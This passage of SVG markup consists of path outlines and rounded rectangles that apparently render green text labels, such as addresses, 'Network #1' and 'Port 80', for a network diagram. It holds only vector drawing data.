d="m756.05,260.12c0,.64-.2,1.13-.61,1.47-.41.34-.87.5-1.38.5s-.98-.17-1.38-.5c-.41-.34-.61-.83-.61-1.47s.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m759.74,261.82c.09-1.04.26-2.13.54-3.26.27-1.13.6-2.24,1-3.33.39-1.09.83-2.12,1.32-3.08.49-.97.98-1.8,1.48-2.5h-6.46v-2.73h10.41v2.32c-.46.5-.96,1.2-1.51,2.08-.55.89-1.07,1.89-1.57,3.02-.49,1.12-.92,2.33-1.29,3.62-.36,1.29-.59,2.58-.68,3.86h-3.24Z" style="fill: #a3ea2a;"/>    <path d="m780.35,254.34c0,2.5-.48,4.43-1.43,5.76-.95,1.34-2.27,2.01-3.94,2.01s-2.99-.67-3.94-2.01c-.95-1.34-1.43-3.26-1.43-5.76,0-1.25.12-2.35.38-3.31s.61-1.77,1.08-2.43c.47-.66,1.04-1.16,1.7-1.5.66-.34,1.4-.51,2.21-.51,1.67,0,2.99.67,3.94,2.01.95,1.34,1.43,3.25,1.43,5.74Zm-3.26,0c0-.74-.04-1.42-.11-2.03-.07-.61-.19-1.13-.34-1.58-.16-.44-.37-.79-.64-1.03-.27-.24-.61-.36-1.01-.36s-.73.12-1,.36c-.27.24-.48.59-.64,1.03-.17.44-.28.97-.35,1.58s-.11,1.28-.11,2.03.04,1.42.11,2.04.19,1.15.35,1.59c.16.44.38.79.64,1.03.26.24.6.37,1,.37s.74-.12,1.01-.37.49-.59.64-1.03c.16-.44.27-.97.34-1.59.07-.62.11-1.3.11-2.04Z" style="fill: #a3ea2a;"/>  </g>  <rect x="1007.51" y="236.12" width="236.24" height="37.96" rx="7.26" ry="7.26" style="fill: #223654;"/>  <g>    <path d="m1064.33,250.03c.42-.17.85-.37,1.3-.59.45-.22.89-.46,1.32-.73.43-.26.84-.54,1.24-.84.39-.29.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78-.53.24-1.04.44-1.54.61l-.97-2.47Z" style="fill: #a3ea2a;"/>    <path d="m1078.07,261.82c.09-1.04.26-2.13.54-3.26.27-1.13.6-2.24,1-3.33.39-1.09.83-2.12,1.32-3.08.49-.97.98-1.8,1.48-2.5h-6.46v-2.73h10.41v2.32c-.46.5-.96,1.2-1.51,2.08-.55.89-1.07,1.89-1.57,3.02-.49,1.12-.92,2.33-1.29,3.62s-.59,2.58-.68,3.86h-3.24Z" style="fill: #a3ea2a;"/>    <path d="m1097.87,250.84c0,.54-.11,1.07-.32,1.57-.21.5-.49.98-.84,1.45-.34.46-.73.91-1.16,1.34-.43.43-.85.84-1.27,1.22-.21.2-.45.43-.7.68-.25.25-.49.5-.72.76-.23.26-.43.5-.61.72-.18.22-.29.41-.33.55h6.4v2.68h-9.92c-.03-.16-.04-.36-.04-.6v-.51c0-.69.11-1.32.33-1.89.22-.57.51-1.11.87-1.6.36-.49.76-.96,1.21-1.38.45-.43.9-.86,1.34-1.29.34-.33.67-.64.97-.93.3-.29.56-.58.79-.86.23-.28.41-.56.54-.84s.19-.56.19-.85c0-.63-.18-1.07-.54-1.33-.36-.26-.8-.39-1.33-.39-.39,0-.75.06-1.08.18-.34.12-.64.26-.92.43-.28.17-.52.33-.72.49-.2.17-.35.3-.45.4l-1.59-2.23c.63-.59,1.36-1.07,2.2-1.45.84-.38,1.74-.57,2.69-.57.87,0,1.62.1,2.25.3.63.2,1.15.48,1.56.85s.71.81.9,1.33c.19.52.29,1.11.29,1.77Z" style="fill: #a3ea2a;"/>    <path d="m1104.05,260.12c0,.64-.2,1.13-.61,1.47-.41.34-.87.5-1.38.5s-.98-.17-1.38-.5c-.41-.34-.61-.83-.61-1.47s.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m1110.99,252.33c.93,0,1.72.12,2.37.38.65.25,1.18.59,1.6,1.02.42.43.72.93.9,1.5.19.57.28,1.18.28,1.82,0,.57-.1,1.16-.31,1.76-.21.6-.52,1.15-.94,1.63s-.96.89-1.61,1.2-1.42.47-2.31.47c-1.79,0-3.15-.57-4.08-1.7-.93-1.13-1.4-2.69-1.4-4.68,0-1.43.22-2.7.67-3.8s1.08-2.03,1.9-2.78c.82-.75,1.82-1.32,2.98-1.72,1.17-.39,2.48-.6,3.94-.61.03.44.06.88.09,1.3.03.42.06.86.09,1.32-.73.01-1.41.08-2.05.2-.64.12-1.22.31-1.74.57-.52.26-.98.59-1.36,1-.39.41-.69.91-.9,1.49.31-.14.64-.24.97-.3.33-.06.64-.09.92-.09Zm-.41,2.49c-.31,0-.65.03-1.01.09-.36.06-.64.14-.84.24,0,.06,0,.14-.01.26,0,.12-.01.21-.01.3,0,.52.04,1,.11,1.46.07.46.19.86.37,1.2.17.34.4.61.69.81.29.19.64.29,1.07.29.36,0,.66-.08.91-.23.25-.15.46-.34.62-.57.16-.23.29-.48.37-.76.08-.28.12-.55.12-.81,0-.73-.18-1.29-.55-1.69-.37-.39-.98-.59-1.84-.59Z" style="fill: #a3ea2a;"/>    <path d="m1128.27,257.67c0,.64-.11,1.24-.33,1.77-.22.54-.55,1.01-1,1.41-.44.4-1,.71-1.66.94-.67.22-1.44.33-2.31.33-1,0-1.84-.14-2.5-.42-.67-.28-1.2-.63-1.61-1.04-.41-.42-.7-.87-.87-1.37-.17-.5-.26-.95-.26-1.37s.06-.82.17-1.18.27-.68.47-.98c.2-.29.43-.56.68-.81.25-.24.52-.47.81-.69-.62-.5-1.07-.99-1.36-1.48-.29-.49-.44-1.11-.44-1.87,0-.57.12-1.12.35-1.65.24-.53.57-.99,1-1.38s.95-.71,1.56-.94c.61-.24,1.28-.35,2.03-.35.87,0,1.62.12,2.24.38.62.25,1.13.57,1.54.95.4.39.69.82.87,1.3s.27.95.27,1.43c0,.69-.18,1.33-.55,1.92-.36.59-.82,1.06-1.36,1.4.82.53,1.4,1.09,1.75,1.67.35.58.53,1.26.53,2.03Zm-7.43.13c0,.17.04.36.12.57.08.21.2.4.38.57.17.17.39.32.67.43.27.12.6.17.99.17.74,0,1.29-.18,1.63-.54.34-.36.52-.76.52-1.21,0-.33-.08-.62-.23-.88-.15-.26-.35-.48-.61-.68-.26-.19-.56-.37-.91-.52-.35-.15-.73-.29-1.13-.42-.4.3-.74.65-1.01,1.05-.27.4-.41.88-.41,1.44Zm3.97-7.06c0-.16-.03-.32-.1-.5-.06-.18-.17-.35-.32-.5-.15-.16-.34-.29-.57-.4-.23-.11-.51-.16-.84-.16s-.59.05-.82.15c-.23.1-.42.23-.57.4-.15.16-.26.34-.33.52-.07.19-.11.36-.11.54,0,.46.17.88.5,1.29.34.4.91.74,1.73,1.03.46-.29.81-.61,1.05-.98.24-.37.37-.83.37-1.37Z" style="fill: #a3ea2a;"/>    <path d="m1133.72,260.12c0,.64-.2,1.13-.61,1.47s-.87.5-1.38.5-.98-.17-1.38-.5-.61-.83-.61-1.47.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m1144.35,246.94v8.93h1.59v2.62h-1.59v3.33h-3.13v-3.33h-6.42v-2.34c.32-.63.71-1.34,1.18-2.14.47-.79,1-1.61,1.58-2.45.58-.84,1.19-1.66,1.83-2.46.64-.8,1.29-1.52,1.93-2.17h3.03Zm-3.13,3.91c-.56.73-1.15,1.52-1.78,2.38s-1.16,1.74-1.59,2.64h3.37v-5.02Z" style="fill: #a3ea2a;"/>    <path d="m1151.46,262.14c-.39,0-.79-.03-1.22-.08-.43-.05-.84-.12-1.25-.2-.4-.09-.77-.18-1.1-.28-.33-.1-.59-.19-.77-.28l.62-2.66c.37.16.85.33,1.43.5.58.18,1.3.27,2.16.27.99,0,1.71-.19,2.17-.56s.69-.87.69-1.5c0-.39-.08-.71-.25-.98-.17-.26-.39-.48-.68-.64-.29-.16-.63-.28-1.02-.34-.39-.06-.81-.1-1.26-.1h-1.25v-2.58h1.42c.31,0,.62-.03.91-.09.29-.06.55-.15.78-.29.23-.14.41-.32.55-.56.14-.24.2-.53.2-.89,0-.27-.06-.51-.17-.71-.11-.2-.26-.37-.44-.49-.18-.13-.39-.22-.62-.29s-.48-.1-.72-.1c-.62,0-1.18.09-1.71.28-.52.19-1,.42-1.43.69l-1.14-2.34c.23-.14.5-.29.8-.45s.65-.3,1.02-.43.77-.24,1.19-.32c.42-.09.87-.13,1.34-.13.87,0,1.63.1,2.26.31s1.16.5,1.58.88.72.82.92,1.33.3,1.06.3,1.66-.17,1.15-.49,1.71c-.33.55-.77.97-1.33,1.25.77.32,1.37.78,1.79,1.41.42.62.63,1.37.63,2.25,0,.69-.12,1.32-.34,1.9-.23.58-.59,1.08-1.07,1.5-.49.42-1.11.75-1.86.99-.75.24-1.64.35-2.67.35Z" style="fill: #a3ea2a;"/>    <path d="m1163.39,260.12c0,.64-.2,1.13-.61,1.47-.41.34-.87.5-1.38.5s-.98-.17-1.38-.5c-.41-.34-.61-.83-.61-1.47s.2-1.13.61-1.47c.41-.34.87-.5,1.38-.5s.98.17,1.38.5c.41.34.61.83.61,1.47Z" style="fill: #a3ea2a;"/>    <path d="m1174.68,250.84c0,.54-.11,1.07-.32,1.57s-.49.98-.84,1.45c-.34.46-.73.91-1.16,1.34s-.85.84-1.27,1.22c-.21.2-.45.43-.7.68s-.49.5-.72.76c-.23.26-.43.5-.61.72-.18.22-.29.41-.33.55h6.4v2.68h-9.92c-.03-.16-.04-.36-.04-.6v-.51c0-.69.11-1.32.33-1.89s.51-1.11.87-1.6c.36-.49.76-.96,1.21-1.38.45-.43.9-.86,1.34-1.29.34-.33.67-.64.97-.93s.57-.58.79-.86c.23-.28.41-.56.54-.84s.19-.56.19-.85c0-.63-.18-1.07-.54-1.33-.36-.26-.8-.39-1.33-.39-.39,0-.75.06-1.08.18-.34.12-.64.26-.92.43-.28.17-.52.33-.72.49-.2.17-.35.3-.45.4l-1.59-2.23c.63-.59,1.36-1.07,2.2-1.45.84-.38,1.74-.57,2.69-.57.87,0,1.62.1,2.25.3.63.2,1.15.48,1.56.85.41.37.71.81.9,1.33s.29,1.11.29,1.77Z" style="fill: #a3ea2a;"/>    <path d="m1177.73,250.03c.42-.17.85-.37,1.3-.59.45-.22.89-.46,1.32-.73.43-.26.84-.54,1.23-.84s.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78s-1.04.44-1.55.61l-.97-2.47Z" style="fill: #a3ea2a;"/>  </g>  <rect x="142.4" y="624.39" width="148.9" height="37.96" rx="5.76" ry="5.76" style="fill: #223654;"/>  <g>    <path d="m163.31,650.09c-.96-1.7-2-3.38-3.11-5.04-1.12-1.66-2.3-3.23-3.56-4.7v9.75h-3.31v-14.88h2.73c.47.47.99,1.05,1.57,1.74.57.69,1.16,1.42,1.75,2.2.59.78,1.18,1.59,1.77,2.43.59.84,1.14,1.64,1.65,2.42v-8.78h3.33v14.88h-2.81Z" style="fill: #a3ea2a;"/>    <path d="m168.81,644.53c0-1,.15-1.88.46-2.63.31-.75.71-1.38,1.21-1.88s1.08-.88,1.73-1.14c.65-.26,1.32-.39,2.01-.39,1.6,0,2.87.49,3.8,1.47.93.98,1.4,2.42,1.4,4.33,0,.19,0,.39-.02.61-.01.22-.03.42-.04.59h-7.26c.07.66.38,1.18.92,1.57.54.39,1.27.58,2.19.58.59,0,1.16-.05,1.73-.16s1.03-.24,1.38-.4l.43,2.6c-.17.09-.4.17-.69.26-.29.09-.6.16-.96.23-.35.06-.73.12-1.13.16-.4.04-.8.06-1.2.06-1.02,0-1.9-.15-2.65-.45s-1.37-.71-1.87-1.23c-.49-.52-.86-1.14-1.1-1.86-.24-.71-.35-1.49-.35-2.32Zm7.51-1.22c-.01-.27-.06-.54-.14-.79s-.2-.49-.36-.69c-.16-.2-.37-.37-.62-.49-.25-.13-.56-.19-.93-.19s-.67.06-.92.18c-.26.12-.47.28-.64.48s-.3.43-.4.7c-.09.27-.16.53-.2.81h4.23Z" style="fill: #a3ea2a;"/>    <path d="m181.78,635.98l3.2-.52v3.33h3.84v2.66h-3.84v3.97c0,.67.12,1.21.35,1.61.24.4.71.6,1.43.6.34,0,.7-.03,1.06-.1.36-.06.7-.15,1-.27l.45,2.49c-.39.16-.82.29-1.29.41-.47.11-1.05.17-1.74.17-.87,0-1.6-.12-2.17-.35-.57-.24-1.03-.57-1.37-.99-.34-.42-.58-.93-.72-1.54-.14-.6-.2-1.27-.2-2v-9.49Z" style="fill: #a3ea2a;"/>    <path d="m198.51,643.6c-.29,1.09-.59,2.17-.91,3.24-.32,1.07-.66,2.15-1.02,3.24h-2.49c-.26-.6-.54-1.32-.84-2.15-.3-.83-.61-1.74-.94-2.72-.32-.98-.65-2.02-.99-3.11-.34-1.1-.66-2.2-.98-3.32h3.37c.12.52.24,1.08.38,1.69.14.61.28,1.23.43,1.88.15.64.31,1.29.48,1.94s.33,1.28.51,1.88c.19-.63.37-1.27.55-1.93.18-.66.35-1.31.52-1.94.16-.64.32-1.25.47-1.85.15-.59.28-1.15.4-1.66h2.32c.11.52.24,1.07.39,1.66s.29,1.21.45,1.85c.16.64.32,1.29.49,1.94.17.66.35,1.3.54,1.93.17-.6.35-1.23.52-1.88.17-.65.33-1.3.49-1.94.15-.64.29-1.27.43-1.88s.26-1.17.38-1.69h3.33c-.32,1.12-.64,2.22-.98,3.32-.34,1.09-.67,2.13-.99,3.11-.32.98-.64,1.89-.95,2.72s-.59,1.54-.85,2.15h-2.49c-.36-1.09-.71-2.17-1.05-3.24-.34-1.07-.66-2.15-.94-3.24Z" style="fill: #a3ea2a;"/>    <path d="m218.77,644.42c0,.89-.13,1.7-.39,2.44-.26.74-.63,1.37-1.12,1.89-.49.52-1.07.93-1.75,1.21-.68.29-1.44.43-2.29.43s-1.59-.14-2.27-.43c-.68-.29-1.26-.69-1.75-1.21-.49-.52-.87-1.15-1.14-1.89-.27-.74-.41-1.55-.41-2.44s.14-1.7.42-2.43c.28-.73.67-1.35,1.16-1.87.49-.52,1.08-.92,1.76-1.2.68-.29,1.42-.43,2.22-.43s1.56.14,2.24.43c.68.29,1.26.69,1.75,1.2.49.52.87,1.14,1.14,1.87.27.73.41,1.54.41,2.43Zm-3.26,0c0-.99-.2-1.76-.59-2.33-.39-.57-.96-.85-1.69-.85s-1.3.28-1.7.85-.6,1.34-.6,2.33.2,1.77.6,2.35c.4.58.97.87,1.7.87s1.29-.29,1.69-.87c.39-.58.59-1.36.59-2.35Z" style="fill: #a3ea2a;"/>    <path d="m228.04,641.63c-.29-.07-.62-.15-1.01-.23-.39-.08-.8-.12-1.25-.12-.2,0-.44.02-.72.05-.28.04-.49.08-.63.12v8.63h-3.2v-10.69c.57-.2,1.25-.39,2.03-.57.78-.18,1.65-.27,2.61-.27.17,0,.38.01.62.03.24.02.49.05.73.09.24.04.49.08.73.13.24.05.45.11.62.18l-.54,2.64Z" style="fill: #a3ea2a;"/>    <path d="m233.5,642.85c.31-.34.64-.7.98-1.07s.66-.74.98-1.1c.31-.36.61-.71.89-1.04s.52-.61.72-.85h3.8c-.76.87-1.5,1.7-2.22,2.5-.72.79-1.51,1.61-2.37,2.45.43.39.87.85,1.33,1.39.46.54.9,1.09,1.33,1.67.43.57.82,1.15,1.18,1.72.36.57.66,1.1.9,1.57h-3.68c-.23-.37-.49-.79-.78-1.24-.29-.45-.6-.9-.93-1.36-.33-.45-.67-.89-1.04-1.3s-.73-.77-1.08-1.05v4.95h-3.2v-16.15l3.2-.51v9.42Z" style="fill: #a3ea2a;"/>    <path d="m253.37,638.86h2.49l.7-3.65h2.79l-.7,3.65h1.56v2.47h-2.03l-.51,2.64h2.54v2.47h-3.01l-.7,3.65h-2.79l.7-3.65h-2.49l-.7,3.65h-2.79l.7-3.65h-1.56v-2.47h2.03l.51-2.64h-2.54v-2.47h3.01l.7-3.65h2.79l-.7,3.65Zm-.98,5.11h2.49l.51-2.64h-2.49l-.51,2.64Z" style="fill: #a3ea2a;"/>    <path d="m262.89,638.3c.42-.17.85-.37,1.3-.59s.89-.46,1.32-.73c.43-.26.84-.54,1.23-.84.39-.29.75-.6,1.06-.93h2.23v14.88h-3.2v-10.71c-.43.29-.91.55-1.44.78-.53.24-1.04.44-1.55.61l-.97-2.47Z" style="fill: #a3ea2a;"/>  </g>  <g>    <path d="m271.43,309.72c2.22,0,3.92.39,5.11,1.17s1.78,2.06,1.78,3.83-.6,3.08-1.8,3.88c-1.2.79-2.92,1.19-5.15,1.19h-1.05v4.98h-3.35v-14.66c.73-.14,1.5-.24,2.32-.3.82-.06,1.53-.08,2.15-.08Zm.21,2.86c-.24,0-.48,0-.72.02-.24.01-.44.03-.61.04v4.29h1.05c1.16,0,2.03-.16,2.62-.47.59-.31.88-.9.88-1.76,0-.42-.08-.76-.23-1.03s-.37-.49-.64-.66c-.28-.16-.62-.28-1.02-.34-.4-.06-.84-.1-1.33-.1Z" style="fill: #a3ea2a;"/>    <path d="m290.81,319.1c0,.89-.13,1.7-.39,2.44-.26.74-.63,1.37-1.12,1.89-.49.52-1.07.93-1.75,1.21-.68.29-1.44.43-2.29.43s-1.59-.14-2.27-.43c-.68-.29-1.26-.69-1.75-1.21-.49-.52-.87-1.15-1.14-1.89-.27-.74-.41-1.55-.41-2.44s.14-1.7.42-2.43c.28-.73.67-1.35,1.16-1.87.49-.52,1.08-.92,1.76-1.2.68-.29,1.42-.43,2.22-.43s1.56.14,2.24.43c.68.29,1.26.69,1.75,1.2.49.52.87,1.14,1.14,1.87.27.73.41,1.54.41,2.43Zm-3.26,0c0-.99-.2-1.76-.59-2.33-.39-.57-.96-.85-1.69-.85s-1.3.28-1.7.85-.6,1.34-.6,2.33.2,1.77.6,2.35c.4.58.97.87,1.7.87s1.29-.29,1.69-.87c.39-.58.59-1.36.59-2.35Z" style="fill: #a3ea2a;"/>    <path d="m300.09,316.31c-.29-.07-.62-.15-1.01-.23-.39-.08-.8-.12-1.25-.12-.2,0-.44.02-.72.05-.28.04-.49.08-.63.12v8.63h-3.2v-10.69c.57-.2,1.25-.39,2.03-.57.78-.18,1.65-.27,2.61-.27.17,0,.38.01.62.03.24.02.49.05.73.09.24.04.49.08.73.13.24.05.45.11.62.18l-.54,2.64Z" style="fill: #a3ea2a;"/>    <path d="m302.23,310.66l3.2-.52v3.33h3.84v2.66h-3.84v3.97c0,.67.12,1.21.35,1.61.24.4.71.6,1.43.6.34,0,.7-.03,1.06-.1.36-.06.7-.15,1-.27l.45,2.49c-.39.16-.82.29-1.29.41-.47.11-1.05.17-1.74.17-.87,0-1.6-.12-2.17-.35-.57-.24-1.03-.57-1.37-.99-.34-.42-.58-.93-.72-1.54-.14-.6-.2-1.27-.2-2v-9.49Z" style="fill: #a3ea2a;"/>    <path d="m326.9,320.62c0,.64-.11,1.24-.33,1.77-.22.54-.56,1.01-1,1.41-.44.4-1,.71-1.66.94-.67.22-1.44.33-2.31.33-1,0-1.84-.14-2.5-.42s-1.2-.63-1.61-1.04c-.41-.42-.7-.87-.87-1.37-.17-.5-.26-.95-.26-1.37s.06-.82.17-1.18c.11-.36.27-.68.47-.98.2-.29.43-.56.68-.81.25-.24.52-.47.81-.69-.62-.5-1.07-.99-1.36-1.48-.29-.49-.44-1.11-.44-1.87,0-.57.12-1.12.35-1.65.24-.53.57-.99,1-1.38.43-.39.95-.71,1.56-.94.61-.24,1.28-.35,2.03-.35.87,0,1.62.12,2.24.38s1.13.57,1.54.95.69.82.87,1.3c.18.48.27.95.27,1.43,0,.69-.18,1.33-.55,1.92-.36.59-.82,1.06-1.36,1.4.82.53,1.4,1.09,1.75,1.67.35.58.53,1.26.53,2.03Zm-7.43.13c0,.17.04.36.12.57s.2.4.38.57c.17.17.39.32.67.43.27.12.6.17.99.17.74,0,1.29-.18,1.63-.54.34-.36.52-.76.52-1.21,0-.33-.07-.62-.23-.88-.15-.26-.35-.48-.61-.68-.26-.19-.56-.37-.91-.52-.35-.15-.73-.29-1.13-.42-.4.3-.74.65-1.01,1.05-.27.4-.41.88-.41,1.44Zm3.97-7.06c0-.16-.03-.32-.1-.5-.06-.18-.17-.35-.32-.5-.15-.16-.34-.29-.57-.4-.23-.11-.51-.16-.84-.16s-.59.05-.82.15c-.23.1-.42.23-.57.4-.15.16-.26.34-.33.52-.07.19-.11.36-.11.54,0,.46.17.88.5,1.29.34.4.91.74,1.73,1.03.46-.29.81-.61,1.05-.98.24-.37.37-.83.37-1.37Z" style="fill: #a3ea2a;"/>    <path d="m339.18,317.3c0,2.5-.48,4.43-1.43,5.76-.95,1.34-2.27,2.01-3.94,2.01s-2.99-.67-3.94-2.01c-.95-1.34-1.43-3.26-1.43-5.76,0-1.25.12-2.35.38-3.31s.61-1.77,1.08-2.43c.47-.66,1.04-1.16,1.7-1.5.66-.34,1.4-.51,2.21-.51,1.67,0,2.99.67,3.94,2.01.95,1.34,1.43,3.25,1.43,5.74Zm-3.26,0c0-.74-.04-1.42-.11-2.03-.07-.61-.19-1.13-.34-1.58-.16-.44-.37-.79-.64-1.03-.27-.24-.61-.36-1.01-.36s-.73.12-1,.36c-.27.24-.48.59-.64,1.03-.17.44-.28.97-.35,1.58s-.11,1.28-.11,2.03.04,1.42.11,2.04.19,1.15.35,1.59c.16.44.38.79.64,1.03.26.24.6.37,1,.37s.74-.12,1.01-.37.49-.59.64-1.03c.16-.44.27-.97.34-1.59.07-.62.11-1.3.11-2.04Z" style="fill: #a3ea2a;"/>  </g>  <rect x="612.36" y="299.07" width="236.24" height="37.96" rx="7.26" ry="7.26" style="fill: #223654;"/>  <g>    <path d="m699.32,309.72c2.22,0,3.92.39,5.11,1.17s1.78,2.06,1.78,3.83-.6,3.08-1.8,3.88c-1.2.79-2.92,1.19-5.15,1.19h-1.05v4.98h-3.35v-14.66c.73-.14,1.5-.24,2.32-.3.82-.06,1.53-.08,2.15-.08Zm.21,2.86c-.24,0-.48,0-.72.02-.24.01-.44.03-.61.04v4.29h1.05c1.16,0,2.03-.16,2.62-.47.59-.31.88-.9.88-1.76,0-.42-.08-.76-.23-1.03s-.37-.49-.64-.66c-.28-.16-.62-.28-1.02-.34-.4-.06-.84-.1-1.33-.1Z" style="fill: #a3ea2a;"/>    <path d="m718.71,319.1c0,.89-.13,1.7-.39,2.44-.26.74-.63,1.37-1.12,1.89-.49.52-1.07.93-1.75,1.21-.68.29-1.44.43-2.29.43s-1.59-.14-2.27-.43c-.68-.29-1.26-.69-1.75-1.21-.49-.52-.87-1.15-1.14-1.89-.27-.74-.41-1.55-.41-2.44s.14-1.7.42-2.43c.28-.73.67-1.35,1.16-1.87.49-.52,1.08-.92,1.76-1.2.68-.29,1.42-.43,2.22-.43s1.56.14,2.24.43c.68.29,1.26.69,1.75,1.2.49.52.87,1.14,1.14,1.87.27.73.41,1.54.41,2.43Zm-3.26,0c0-.99-.2-1.76-.59-2.33-.39-.57-.96-.85-1.69-.85s-1.3.28-1.7.85-.6,1.34-.6,2.33.2,1.77.6,2.35c.4.58.97.87,1.7.87s1.29-.29,1.69-.87c.39-.58.59-1.36.59-2.35Z" style="fill: #a3ea2a;"/>    <path d="m727.99,316.31c-.29-.07-.62-.15-1.01-.23-.39-.08-.8-.12-1.25-.12-.2,0-.44.02-.72.05-.28.04-.49.08-.63.12v8.63h-3.2v-10.69c.57-.2,1.25-.39,2.03-.57.78-.18,1.65-.27,2.61-.27.17,0,.38.01.62.03.24.02.49.05.73.09.24.04.49.08.73.13.24.05.45.11.62.18l-.54,2.64Z" style="fill: #a3ea2a;"/>    <path d="m730.13,310.66l3.2-.52v3.33h3.84v2.66h-3.84v3.97c0,.67.12,1.21.35,1.61.24.4.71.6,1.43.6.34,0,.7-.03,1.06-.1.36-.06.7-.15,1-.27l.45,2.49c-.39.16-.82.29-1.29.41-.47.11-1.05.17-1.74.17-.87,0-1.6-.12-2.17-.35-.57-.24-1.03-.57-1.37-.99-.34-.42-.58-.93-.72-1.54-.14-.6-.2-1.27-.2-2v-9.49Z" style="fill: #a3ea2a;"/>    <path d="m754.8,320.62c0,.64-.11,1.24-.33,1.77-.22.54-.56,1.01-1,1.41-.44.4-1,.71-1.66.94-.67.22-1.44.33-2.31.33-1,0-1.84-.14-2.5-.42s-1.2-.63-1.61-1.04c-.41-.42-.7-.87-.87-1.37-.17-.5-.26-.95-.26-1.37s.06-.82.17-1.18c.11-.36.27-.68.47-.98.2-.29.43-.56.68-.81.25-.24.52-.47.81-.69-.62-.5-1.07-.99-1.36-1.48-.29-.49-.44-1.11-.44-1.87,0-.57.12-1.12.35-1.65.24-.53.57-.99,1-1.38.43-.39.95-.71,1.56-.94.61-.24,1.28-.35,2.03-.35.87,0,1.62.12,2.24.38s1.13.57,1.54.95.69.82.87,1.3c.18.48.27.95.27,1.43,0,.69-.18,1.33-.55,1.92-.36.59-.82,1.06-1.36,1.4.82.53,1.4,1.09,1.75,1.67.35.58.53,1.26.53,2.03Zm-7.43.13c0,.17.04.36.12.57s.2.4.38.57c.17.17.39.32.67.43.27.12.6.17.99.17.74,0,1.29-.18,1.63-.54.34-.36.52-.76.52-1.21,0-.33-.07-.62-.23-.88-.15-.26-.35-.48-.61-.68-.26-.19-.56-.37-.91-.52-.35-.15-.73-.29-1.13-.42-.4.3-.74.65-1.01,1.05-.27.4-.41.88-.41,1.44Zm3.97-7.06c0-.16-.03-.32-.1-.5-.06-.18-.17-.35-.32-.5-.15-.16-.34-.29-.57-.4-.23-.11-.51-.16-.84-.16s-.59.05-.82.15c-.23.1-.42.23-.57.4-.15.16-.26.34-.33.52-.07.19-.11.36-.11.54,0,.46.17.88.5,1.29.34.4.91.74,1.73,1.03.46-.29.81-.61,1.05-.98.24-.37.37-.83.37-1.37Z" style="fill: #a3ea2a;"/>    <path d="m767.08,317.3c0,2.5-.48,4.43-1.43,5.76-.95,1.34-2.27,2.01-3.94,2.01s-2.99-.67-3.94-2.01c-.95-1.34-1.43-3.26-1.43-5.76,0-1.25.12-2.35.38-3.31s.61-1.77,1.08-2.43c.47-.66,1.04-1.16,1.7-1.5.66-.34,1.4-.51,2.21-.51,1.67,0,2.99.67,3.94,2.01.95,1.34,1.43,3.25,1.43,5.74Zm-3.26,0c0-.74-.04-1.42-.11-2.03-.07-.61-.19-1.13-.34-1.58-.16-.44-.37-.79-.64-1.03-.27-.24-.61-.36-1.01-.36s-.73.12-1,.36c-.27.24-.48.59-.64,1.03-.17.44-.28.97-.35,1.58s-.11,1.28-.11,2.03.04,1.42.11,2.04.19,1.15.35,1.59c.16.44.38.79.64,1.03.26.24.6.37,1,.37s.74-.12,1.01-.37.49-.59.64-1.03c.16-.44.27-.97.34-1.59.07-.62.11-1.3.11-2.04Z" style="fill: #a3ea2a;"/>  </g>  <rect x="831.55" y="350.95" width="236.24" height="37.96" rx="7.26" ry="7.26" style="fill: #223654;"/>  <g>    <path d="m901.67,361.77v2.86h-4.49v12.02h-3.35v-12.02h-4.49v-2.86h12.32Z" style="fill: #a3ea2a;"/>    <path d="m903.6,376.65v-16.15l3.2-.51v5.41c.21-.07.49-.14.83-.2.34-.06.66-.1.98-.1.92,0,1.68.13,2.29.38.61.25,1.09.6,1.46,1.06.36.46.62,1,.77,1.63s.23,1.33.23,2.1v6.38h-3.2v-5.99c0-1.03-.13-1.76-.4-2.19-.26-.43-.75-.64-1.47-.64-.29,0-.55.03-.8.08-.25.05-.48.1-.68.16v8.59h-3.2Z" style="fill: #a3ea2a;"/>    <path d="m915.71,371.08c0-1,.15-1.88.46-2.63.31-.75.71-1.38,1.21-1.88s1.08-.88,1.73-1.14c.65-.26,1.32-.39,2.01-.39,1.6,0,2.87.49,3.8,1.47.93.98,1.4,2.42,1.4,4.33,0,.19,0,.39-.02.61-.01.22-.03.42-.04.59h-7.26c.07.66.38,1.18.92,1.57s1.27.58,2.19.58c.59,0,1.16-.05,1.73-.16s1.03-.24,1.38-.4l.43,2.6c-.17.09-.4.17-.69.26-.29.09-.61.16-.96.23s-.73.12-1.13.16-.8.06-1.2.06c-1.02,0-1.9-.15-2.65-.45-.75-.3-1.37-.71-1.87-1.23s-.86-1.14-1.09-1.86c-.24-.71-.35-1.49-.35-2.32Zm7.51-1.22c-.01-.27-.06-.54-.14-.79-.08-.26-.2-.49-.37-.69s-.37-.37-.62-.49c-.25-.13-.56-.19-.93-.19s-.67.06-.92.18c-.26.12-.47.28-.64.48s-.3.43-.4.7c-.09.27-.16.53-.2.81h4.23Z" style="fill: #a3ea2a;"/>    <path d="m937.44,362.09c0,.59-.19,1.05-.57,1.38-.38.34-.83.5-1.34.5s-.96-.17-1.34-.5c-.38-.34-.57-.8-.57-1.38s.19-1.05.57-1.38c.38-.34.83-.5,1.34-.5s.96.17,1.34.5c.38.34.57.8.57,1.38Zm-.3,14.56h-3.2v-11.29h3.2v11.29Z" style="fill: #a3ea2a;"/>    <path d="m940.14,365.74c.54-.16,1.25-.3,2.1-.44.86-.14,1.76-.2,2.71-.2s1.76.13,2.39.38c.64.25,1.14.6,1.51,1.06.37.46.64,1,.79,1.63s.24,1.33.24,2.1v6.38h-3.2v-5.99c0-1.03-.14-1.76-.41-2.19-.27-.43-.78-.64-1.52-.64-.23,0-.47.01-.73.03s-.49.05-.69.08v8.72h-3.2v-10.91Z" style="fill: #a3ea2a;"/>    <path 